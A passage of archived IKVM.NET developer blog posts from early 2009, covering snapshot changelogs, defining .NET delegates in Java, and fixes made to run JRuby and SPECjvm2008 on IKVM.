		<P>As 0.40 is getting nearer, I need some help. This snapshot is pretty close to what the first 0.40 release candidate is going to be. However, there is still something missing. As part of this release cycle I wrote a custom implementation of Reflection.Emit named IKVM.Reflection.Emit. This is the part that is responsible for writing managed PE binaries used by ikvmc. It is also responsible for writing the debugging files (.pdb on .NET and .mdb on Mono). I've written a working .pdb writer, but only a basic (and untested) implementation of the .mdb writer and this where I need help. I need someone to test, debug, finish this. So if you care about being able to debug your Java code in <A href="http://monodevelop.com/">MonoDevelop</A>, please help out! To get an idea of what's involved <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/refemit/IKVM.MdbWriter/SymbolWriter.cs?view=markup">here</A> is the current source.</P>
<P>Changes:</P>
<UL>
<LI>Workaround for Mono bug <A href="https://bugzilla.novell.com/show_bug.cgi?id=486307">486307</A>.</LI>
<LI>Added "Windows 7" detection for os.name system property.</LI>
<LI>Improved IKVM.Reflection.Emit symbol writer "plug in" interface.</LI>
<LI>Wrote a basic (untested) symbol writer for Mono.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3373.zip">ikvmbin-0.39.3373.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/27/2009 06:25:54 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=dc37f6f1-7f5c-4698-a8d2-991e0ecd8cc6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=dc37f6f1-7f5c-4698-a8d2-991e0ecd8cc6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 17 March 2009</h2></div>
<div class="newsItems"><a name="a7892d162-ffa5-49c9-83c1-14b4ae4504f9"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>One major change: I rewrote exception handling to store exception state in java.lang.Throwable (for non-.NET exceptions) instead of using a weak map. I never got around to doing that earlier, because the overhead of exceptions on the CLR is such that the weak map didn't contribute significantly, but on Mono the situation was very different, as it turns out the weap map was very slow there and exception handling is much faster. Anyway, the result is that on Mono a particular microbenchmark went from 40 seconds to less than a second. On the CLR the performance is also a little bit better, but still horrible.</P>
<P>If you use exceptions for control flow, make sure to override fillInStackTrace (simply "return this") as this saves a lot of time in collecting the stack trace. On previous versions of IKVM this sometimes didn't help, but now it always does.</P>
<P>Changes:</P>
<UL>
<LI>Rewrote exception handling.</LI>
<LI>Moved PDB generating code (used by IKVM.Reflection.Emit.dll) into a separate assembly (IKVM.PdbWriter.dll) to work around missing ISymWrapper.dll on Mono.</LI>
<LI>Made java.lang.Object and java.lang.StackTraceElement serializable (in the .NET sense).</LI>
<LI>Added workaround for Mono bug (Type.IsGenericTypeDefinition throws for non-MonoType types).</LI>
<LI>Fixed ikvm.extensions.ExtensionMethods.printStackTrace() to unmap the exception after printing the stack trace.</LI>
<LI>Volker implemented a couple more AWT graphics functions.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3363.zip">ikvmbin-0.39.3363.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/17/2009 07:10:27 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7892d162-ffa5-49c9-83c1-14b4ae4504f9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7892d162-ffa5-49c9-83c1-14b4ae4504f9">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 12 March 2009</h2></div>
<div class="newsItems"><a name="a70da1cdd-fa7f-4bf3-abc8-89b6ec624524"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Various fixes and improvements.</P>
<P>Changes:</P>
<UL>
<LI>Made Mono compilation workarounds conditional on __MonoCS__.</LI>
<LI>Fixed Class.desiredAssertionStatus() instrinsic to use the RemoveAsserts flag from the right class loader.</LI>
<LI>Fixed several generics related bugs in IKVM.Reflection.Emit.</LI>
<LI>Implemented ikvm.internal.ClassLiteral&lt;T&gt; to allow for more efficient class literals.</LI>
<LI>Switched java.awt.print package from GNU Classpath to OpenJDK.</LI>
<LI>Switched java.awt.geom package from GNU Classpath to OpenJDK.</LI>
<LI>Switched java.awt.color package from GNU Classpath to OpenJDK.</LI>
<LI>Switched java.awt.event package from GNU Classpath to OpenJDK.</LI>
<LI>Switched java.awt.datatransfer package from GNU Classpath to OpenJDK.</LI>
<LI>Switched java.awt.dnd package from GNU Classpath to OpenJDK.</LI>
<LI>Added hack to skip running the static initializer when computing the serialVersionUID while running ikvmstub.</LI>
<LI>Added support for defining delegates in Java.</LI>
<LI>Fixed regression introduced in 0.38 that caused LinkageError to be thrown instead of ClassCircularyError.</LI>
<LI>Updated mscorlib.jar (to get the new default constructor in MulticastDelegate).</LI>
<LI>Added utility class ikvm.runtime.Delegates to make it easier to create Runnables and PrivilegeActions from .NET languages.</LI>
<LI>Fixed JNI constructor invocation on dynamically loaded class.</LI>
<LI>Added hack to java.io.FileDescriptor to support JRuby's tty detection.</LI>
<LI>Implemented java.lang.ClassLoader$NativeLibrary.finalize(). Note that under normal circumstances this is never called, because IKVM doesn't support class unloading and by default finalization doesn't run on exit.</LI>
<LI>Fixed IKVM.Reflection.Emit bug that caused NullReferenceException in Save when using the ikvmc -target:module option.</LI></UL>
<P>The last IKVM.Reflection.Emit fix isn't in cvs yet, because <A href="http://apps.sourceforge.net/wordpress/sourceforge/2009/03/11/2009-03-10-service-cvs-unplanned-downtime-update/">SourceForge cvs is down</A>.</P>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3358.zip">ikvmbin-0.39.3358.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/12/2009 06:41:37 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=70da1cdd-fa7f-4bf3-abc8-89b6ec624524"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=70da1cdd-fa7f-4bf3-abc8-89b6ec624524">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 11 March 2009</h2></div>
<div class="newsItems"><a name="a56258673-cc45-4011-ae01-559d862f5693"></a><div class="entry">
	<h3 class="entryTitle">Defining Delegates in Java</h3>
	<div class="entryBody">
		<P>I finally implemented support for defining delegates in Java. The functionality will be available in the next snapshot.</P>
<P>Here's how to do it:</P>
<P><CODE><FONT color=#0000ff>import</FONT> cli.System.<FONT color=#2b91af>AsyncCallback</FONT>;<BR><FONT color=#0000ff>import</FONT> cli.System.<FONT color=#2b91af>IAsyncResult</FONT>;<BR><FONT color=#0000ff>import</FONT> cli.System.<FONT color=#2b91af>MulticastDelegate</FONT>;<BR><BR><FONT color=#0000ff>public final class</FONT> <FONT color=#2b91af>RunnableDelegate</FONT> <FONT color=#0000ff>extends</FONT> <FONT color=#2b91af>MulticastDelegate</FONT><BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public</FONT> RunnableDelegate(<FONT color=#2b91af>Method</FONT> m) { }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public native void</FONT> Invoke();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public native</FONT> <FONT color=#2b91af>IAsyncResult</FONT> BeginInvoke(<FONT color=#2b91af>AsyncCallback</FONT> callback, <FONT color=#2b91af>Object</FONT> obj);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public native void</FONT> EndInvoke(<FONT color=#2b91af>IAsyncResult</FONT> res);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public interface</FONT> <FONT color=#2b91af>Method</FONT><BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>void</FONT> Invoke();<BR>&nbsp;&nbsp;&nbsp; }<BR>}</CODE></P>
<P>This is the recommended pattern. There is a little flexibility, but there are a number of strict rules, if you violate any of these rules, the class will fail to load (or compile&nbsp;with ikvmc)&nbsp;with a java.lang.VerifyError.</P>
<P>Delegate rules:</P>
<UL>
<LI>Class must extend cli.System.MulticastDelegate. 
<LI>Class must be final. 
<LI>Class must have a single method named Invoke that is public, native, non-final and non-static. 
<LI>Class must have a single public constructor taking an inner interface named Method and have an empty method body (actually it must call the base class default constructor using the canonical bytecode sequence). 
<LI>Class may have BeginInvoke/EndInvoke methods, but if it has either one it must have both. The BeginInvoke and EndInvoke methods must have a singature that is implied by the signature of Invoke. 
<LI>Class must have a public inner interface named Method with a single method named Invoke with a signature identical to the Invoke method in the class. 
<LI>Class may not have any fields. 
<LI>Class may not have any other native methods. 
<LI>Class must be static if it is an inner class. (This isn't a real rule, it follows from the other rules.)</LI></UL>
<P>The delegate is usable from Java like other .NET delegates, but obviously it doesn't add much value there. The real value comes from being able to better interact with other .NET languages. For example, one cool trick is this:</P>
<P><CODE><FONT color=#0000ff>public final class</FONT> <FONT color=#2b91af>RunnableDelegate<BR>&nbsp;&nbsp; </FONT>&nbsp;<FONT color=#0000ff>extends</FONT> <FONT color=#2b91af>MulticastDelegate</FONT><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>implements</FONT> <FONT color=#2b91af>Runnable</FONT><BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public</FONT> RunnableDelegate(<FONT color=#2b91af>Method</FONT> m) { }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public native void</FONT> Invoke();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public interface</FONT> <FONT color=#2b91af>Method</FONT><BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>void</FONT> Invoke();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public void</FONT> run()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Invoke();<BR>&nbsp;&nbsp;&nbsp; }<BR>}</CODE></P>
<P>Now you have a delegate that also implements java.lang.Runnable. Unfortunately, C# doesn't understand that delegates can implement interfaces, so we need a helper method:</P>
<P><CODE><FONT color=#0000ff>package</FONT> ikvm.runtime;<BR><BR><FONT color=#0000ff>public final class</FONT> <FONT color=#2b91af>Delegates</FONT><BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public static</FONT> <FONT color=#2b91af>Runnable</FONT> toRunnable(<FONT color=#2b91af>RunnableDelegate</FONT> delegate)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> delegate;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</CODE></P>
<P>Now you can do this in C#:</P>
<P><CODE>java.lang.<FONT color=#2b91af>Thread</FONT> thread = <FONT color=#0000ff>new</FONT> java.lang.<FONT color=#2b91af>Thread</FONT>(<BR>&nbsp;&nbsp;&nbsp; ikvm.runtime.<FONT color=#2b91af>Delegates</FONT>.toRunnable(<FONT color=#0000ff>delegate</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(<FONT color=#a31515>"Hello World"</FONT>);<BR>&nbsp;&nbsp;&nbsp; }));<BR>thread.start();</CODE></P>
<P>I've currently defined delegates for java.lang.Runnable and java.security.PrivilegedAction as inner classes of <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/classpath/ikvm/runtime/Delegates.java?view=markup">ikvm.runtime.Delegates</A>. There are some other candidate interfaces in IKVM.OpenJDK.Core.dll, but I'll only add them if there is demand, so let me know.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/11/2009 06:44:02 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=56258673-cc45-4011-ae01-559d862f5693"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=56258673-cc45-4011-ae01-559d862f5693">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 March 2009</h2></div>
<div class="newsItems"><a name="a2812ccd8-5c4a-4e5e-83fe-53d064e7b999"></a><div class="entry">
	<h3 class="entryTitle">100% Pure Java</h3>
	<div class="entryBody">
		<IMG style="FLOAT: left; MARGIN-RIGHT: 10px" src="http://www.frijters.net/pure_java_logo-1.gif">
<P>In the past weekend I tried running <A href="http://docs.codehaus.org/display/JRUBY/2009/03/06/JRuby+1.2.0RC2+Released">JRuby 1.2.0RC2</A>'s interactive command line <A href="http://docs.codehaus.org/display/JRUBY/The+JRuby+Tutorial+Part+1.5+-+Using+JIRB+to+Check+Java+Behaviour">jirb</A> on IKVM.NET. It somehow reminded me of an experience I had a little over a decade ago getting an application certified for as 100% Pure Java.</P>
<P>At the time I didn't really see the point of the <A href="http://java.sun.com/products/archive/100percent/4.1.1/100PercentPureJavaCookbook-4_1_1.pdf">100% Pure Java certification</A>, but Sun convinced us (mostly by offering to pay the certification costs), so we went ahead and eventually got certified. As far as I remember we didn't have any major issues, mostly some hardcoded paths that included backslashes and some dependencies on a case insenstive file system (to make it easier to find these issues without having to buy Solaris, I actually patched the C runtime that came with the Windows JDK to make all file access case sensitive). The other problem was that in those days Swing was exceptionally unstable on Solaris, but they eventually conceded that this wasn't our fault ;-)</P>
<P><B>JRuby</B></P>
<P>As some may remember, I have been running JRuby tests <A HREF="/CommentView.aspx?guid=d33a3f51-c6fc-4aaa-b3ce-64b742017c40">for a while</A>. This is an older version of JRuby (I don't even know which version) and not used interactively. In any case, running the most recent JRuby revealed a number of issues:</P>
<OL>
<LI><A href="https://sourceforge.net/mailarchive/forum.php?thread_name=E1LgCNw-0006y8-Ju@23jxhf1.ch3.sourceforge.com&amp;forum_name=ikvm-commit">IKVM.NET bug in JNI that caused constructing an object of a dynamically loaded class via JNI to fail.</A></LI>
<LI><A href="https://sourceforge.net/mailarchive/forum.php?thread_name=E1LgCNK-0006w7-3I@23jxhf1.ch3.sourceforge.com&amp;forum_name=ikvm-commit">IKVM.NET regression introduced a couple of days ago.</A></LI>
<LI><A href="http://www.frijters.net/x64-jit-crash.txt">An infinite recursion bug in the CLR x64 JIT.</A></LI>
<LI>JRuby Issue.</LI>
<LI>JNA Issue (<A href="https://jna.dev.java.net/">JNA</A> is a library used by JRuby that provides P/Invoke like functionality).</LI></OL>
<P><B>JRuby Issue</B></P>
<P>The first issue was that when I started jirb, it would not come up with the <CODE>irb(main):001:0&gt;</CODE> prompt but simply read lines, echo them back and execute them. After debugging this I found that JRuby uses reflection to access the private <CODE>handle</CODE> field in <CODE>java.io.FileDescriptor</CODE> (when on Windows). IKVM's FileDescriptor didn't have a <CODE>handle</CODE> field, because it uses .NET's <CODE>System.IO.Stream</CODE> instead of the native Win32 API.</P>
<P>I solved this by adding a handle property to FileDescriptor (not the <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/openjdk/java/io/FileDescriptor.java?view=markup">actual code</A>):</P>
<P><CODE>@ikvm.lang.<FONT color=#2b91af>Property</FONT>(get = "get_handle")<BR><FONT color=#0000ff>private long</FONT> handle;<BR><BR><FONT color=#0000ff>private long</FONT> get_handle() {<BR>&nbsp; <FONT color=#0000ff>if</FONT> (stream <FONT color=#0000ff>instanceof</FONT> cli.System.IO.<FONT color=#2b91af>FileStream</FONT>) {<BR>&nbsp;&nbsp;&nbsp; cli.System.IO.<FONT color=#2b91af>FileStream</FONT> fs = (cli.System.IO.<FONT color=#2b91af>FileStream</FONT>)stream;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> fs.get_Handle().ToInt64();<BR>&nbsp; } <FONT color=#0000ff>else if</FONT> (<FONT color=#0000ff>this</FONT> == in) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> GetStdHandle(-10).ToInt64();<BR>&nbsp; } <FONT color=#0000ff>else if</FONT> (<FONT color=#0000ff>this</FONT> == out) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> GetStdHandle(-11).ToInt64();<BR>&nbsp; } <FONT color=#0000ff>else if</FONT> (<FONT color=#0000ff>this</FONT> == err) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> GetStdHandle(-12).ToInt64();<BR>&nbsp; }<BR>&nbsp; <FONT color=#0000ff>return</FONT> -1;<BR>}<BR><BR>@<FONT color=#2b91af>DllImportAttribute</FONT>.<FONT color=#2b91af>Annotation</FONT>(<FONT color=#a31515>"kernel32"</FONT>)<BR><FONT color=#0000ff>private static native</FONT> cli.System.<FONT color=#2b91af>IntPtr</FONT> GetStdHandle(<FONT color=#0000ff>int</FONT> nStdHandle);</CODE></P>
<P>Now when JRuby uses reflection to get the handle field, it ends up calling the get_handle method and it will get the right handle back. The nice thing about implementing this as a property it that it means the cost is virtually zero when you're not accessing it and it also delays the full trust requiring native method invocation until it is really needed, which means that partial trust code won't be affected.</P>
<P>This solved the first problem, the right prompt now appeared.</P>
<P><B>JNA Issue</B></P>
<P>The next problem appeared after I ran jruby.jar through ikvmc and ran the resulting jruby.exe. After exiting I would get an exception:</P>
<P><CODE>irb(main):001:0&gt; exit<BR>java.io.IOException: Cannot run program "C:\.virtual-ikvm-home/bin/java": The system cannot find the file specified<BR>&nbsp;&nbsp;&nbsp; at java.lang.ProcessBuilder.start(ProcessBuilder.java:474)<BR>&nbsp;&nbsp;&nbsp; at java.lang.Runtime.exec(Runtime.java:610)<BR>&nbsp;&nbsp;&nbsp; at java.lang.Runtime.exec(Runtime.java:483)<BR>&nbsp;&nbsp;&nbsp; at com.sun.jna.Native$DeleteNativeLibrary.run(Native.java:761)<BR>&nbsp;&nbsp;&nbsp; at java.lang.Thread.threadProc(Thread.java:2297)<BR>&nbsp;&nbsp;&nbsp; at java.lang.Thread$1.Invoke(Thread.java:797)<BR>&nbsp;&nbsp;&nbsp; at cli.System.Threading.ThreadHelper.ThreadStart_Context(Unknown Source)<BR>&nbsp;&nbsp;&nbsp; at cli.System.Threading.ExecutionContext.Run(Unknown Source)<BR>&nbsp;&nbsp;&nbsp; at cli.System.Threading.ThreadHelper.ThreadStart(Unknown Source)<BR>Caused by: java.io.IOException: The system cannot find the file specified<BR>&nbsp;&nbsp;&nbsp; at java.lang.ProcessImpl.&lt;init&gt;(ProcessImpl.java:126)<BR>&nbsp;&nbsp;&nbsp; at java.lang.ProcessImpl.start(ProcessImpl.java:54)<BR>&nbsp;&nbsp;&nbsp; at java.lang.ProcessBuilder.start(ProcessBuilder.java:467)<BR>&nbsp;&nbsp;&nbsp; ... 8 more</CODE></P>
<P>This didn't show up when running via ikvm.exe, because I <A HREF="/PermaLink.aspx?guid=abe9dce7-ea83-4d21-851a-1f819794b445">recently added support</A> for this, but when running jruby.exe the ikvm.exe file wasn't available. I debugged this because I was curious why a new JVM was being started at exit. It turns out that JNA extracts a JNI DLL into the temp directory and wants to delete that at exit. While the DLL is loaded by the JVM, it cannot be deleted so in a shutdown hook it fires up a new JVM to delete the temporary file. This is already pretty gross (and not 100% Pure Java :-)), but not the actual issue. Digging deeper I found that this is the alternative code path, because they first attempt to unload the DLL by explicitly calling <CODE>java.lang.ClassLoader$NativeLibrary.finalize()</CODE> via reflection on the NativeLibrary object that corresponds to their DLL. This is, of course, exceptionally evil. Nevertheless, I have now implemented support for this in IKVM.</P>
<P><B>Conclusion</B></P>
<P>Maybe 100% Pure Java isn't as useless as I thought a decade ago :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/10/2009 06:53:42 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2812ccd8-5c4a-4e5e-83fe-53d064e7b999"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2812ccd8-5c4a-4e5e-83fe-53d064e7b999">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 March 2009</h2></div>
<div class="newsItems"><a name="a2a6ea38d-a07b-44dd-8ae8-316e1b2b33e3"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>In keeping with the recent coincidental trend of releasing a development snapshot every ten days, here's the next one. This time a got a little side tracked and decided to do some optimizations.</P>
<P>A cute one is that Object.getClass() is now an intrinsic in two specific scenarios. The first scenario is trivial, when it is used to do a null reference check (javac uses this pattern, both in its source and <A HREF="/PermaLink.aspx?guid=99fcff6c-8ab7-4358-9467-ddf71dd20acd">in the code it generates</A>), the second scenario is a little more interesting:</P>
<P><CODE><FONT color=#0000ff>boolean</FONT> equals(<FONT color=#2b91af>Object</FONT> other)<BR>{<BR>&nbsp; <FONT color=#0000ff>if</FONT> (other.getClass() != <FONT color=#0000ff>this</FONT>.getClass())<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return false</FONT>;<BR>&nbsp; ...<BR>}</CODE></P>
<P>Is now compiled into:</P>
<P><CODE><FONT color=#0000ff>boolean</FONT> equals(<FONT color=#2b91af>Object</FONT> other)<BR>{<BR>&nbsp; <FONT color=#0000ff>if</FONT> (<FONT color=#2b91af>Type</FONT>.GetTypeHandle(other).Value != <FONT color=#2b91af>Type</FONT>.GetTypeHandle(<FONT color=#0000ff>this</FONT>).Value)<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return false</FONT>;<BR>&nbsp; ...<BR>}</CODE></P>
<P>This removes the need to create (and lookup) the System.Type and java.lang.Class objects entirely.</P>
<P>Changes:</P>
<UL>
<LI>Added wildcard exports for assemblies referenced by non-main assembly in shared class loader group.</LI>
<LI>Intrinsified two uses of Object.getClass().</LI>
<LI>Minor optimization to TypeWrapper.ClassObject.</LI>
<LI>Added optimization to reflective instantiation to use Activator.CreateInstance() when that is almost as fast as our LCG based implementation (which has a far higher initial cost).</LI>
<LI>Removed some unnecessary initializations from java.lang.Class.</LI>
<LI>Changed runtime calls to AccessController.doPrivileged() to explicitly pass callerID.</LI>
<LI>Added support for multi level stack tracking to CodeEmitter.</LI>
<LI>Made most Pop emitting lazy to enable optimizing them away (together with corresponding push).</LI>
<LI>Made loading class literal lazy, to enable optimizing them away when they aren't used (e.g. because an atomic intrinsic).</LI>
<LI>Made Class.desiredAssertionStatus() into an intrinsic, to be able to optimize it away when -removeassertions is used.</LI>
<LI>Avoid constructing AssemblyName objects when reading the export map (it turns out that constructing an AssemblyName is pretty expensive).</LI>
<LI>Made the export map reading lazy.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3348.zip">ikvmbin-0.39.3348.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/02/2009 06:43:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2a6ea38d-a07b-44dd-8ae8-316e1b2b33e3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2a6ea38d-a07b-44dd-8ae8-316e1b2b33e3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 20 February 2009</h2></div>
<div class="newsItems"><a name="aabe9dce7-ea83-4d21-851a-1f819794b445"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Yet more changes to support -sharedclassloader and while I was at <A href="http://www.fosdem.org/2009/schedule/devrooms/freejava">FOSDEM</A> I tried running <A href="http://www.spec.org/jvm2008/">SPECjvm2008</A> so I did the fixes necessary to get that to run. Note that if you want to run SPECjvm2008, you'll have to generate rt.jar (<CODE>ikvmstub -shared ikvm.openjdk.core &amp;&amp; ren IKVM.OpenJDK.Core.jar rt.jar</CODE>) and create an ikvm.exe.config file to set the boot class path to rt.jar:</P>
<P><CODE>&lt;?xml version="1.0"?&gt;<BR>&lt;configuration&gt;<BR>&nbsp; &lt;appSettings&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;add key="ikvm:sun.boot.class.path" value="\ikvm\lib\rt.jar" /&gt;<BR>&nbsp; &lt;/appSettings&gt;<BR>&lt;/configuration&gt;</CODE></P>
<P>Changes:</P>
<UL>
<LI>Implemented JPEGImageWriter.getDefaultWriteParam().</LI>
<LI>Added dummy implementations for java.awt.Graphics.setComposite/getComposite/getFontRenderContext.</LI>
<LI>Added supported for redirecting Runtime.exec("java ...") to ikvm.exe.</LI>
<LI>Small performance improvement to stack walking in ObjectInputStream.</LI>
<LI>Removed several JIT performance workarounds that are no longer needed as of .NET 2.0 SP2 (aka .NET 3.5 SP1) .</LI>
<LI>Added hack to ikvmstub (-shared option) to generate stubs for core class library.</LI>
<LI>Imported <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/classpath/ikvm/internal/JMath.java?view=markup">JMath</A> (John F. Brophy's pure Java port of fdlibm) and use it for most Math functions instead of .NET Math API.</LI>
<LI>Made 32 bit floating point math more compatible by rounding to 32 bit after every operation. On x86 this takes a significant performance hit, but without it the differences were too large for the SPECjvm2008 sunflow benchmark to pass.</LI>
<LI>Set foreground/background colors for java.awt.Graphics created from Image correctly.</LI>
<LI>Added support for setting the JPEG compression level and for custom quantization (but not huffman) tables.</LI>
<LI>Moved Y correction to java.awt.Graphics2D float overload of drawString, so that it too positions the text (approx.) correctly.</LI>
<LI>Don't overwrite the thread context class loader if it has already been set when sun.misc.Launcher initializes. Thanks to Dawid Weiss for finding this.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3338.zip">ikvmbin-0.39.3338.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/20/2009 06:04:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=abe9dce7-ea83-4d21-851a-1f819794b445"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=abe9dce7-ea83-4d21-851a-1f819794b445">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 February 2009</h2></div>
<div class="newsItems"><a name="a45fc1818-c8ef-4070-953c-ab7554385145"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More changes to support -sharedassemblyclassloader,&nbsp;a couple of&nbsp;fixes and Volker's JDBC-ODBC bridge implementation.</P>
<P>Changes:</P>
<UL>
<LI>Moved JDBC code into IKVM.OpenJDK.Jdbc.dll.</LI>
<LI>Added JDBC-ODBC-Bridge (based on System.Data.Odbc) to IKVM.OpenJDK.Jdbc.dll.</LI>
<LI>Fixed IKVM.Reflection.Emit's AssemblyBuilder.AssemblyName to always include Version, Culture and PublicKeyToken.</LI>
<LI>Fixed NullReferenceException in IKVM.Reflection.Emit's SignatureHelper.WriteType.</LI>
<LI>Implemented TypeWrapper.GetEnclosingMethod for ReflectionOnly assemblies (this allows ikvmstub to work on ikvmc generated assemblies loaded by specifying a path).</LI>
<LI>Fixed pointer type check for method return types.</LI>
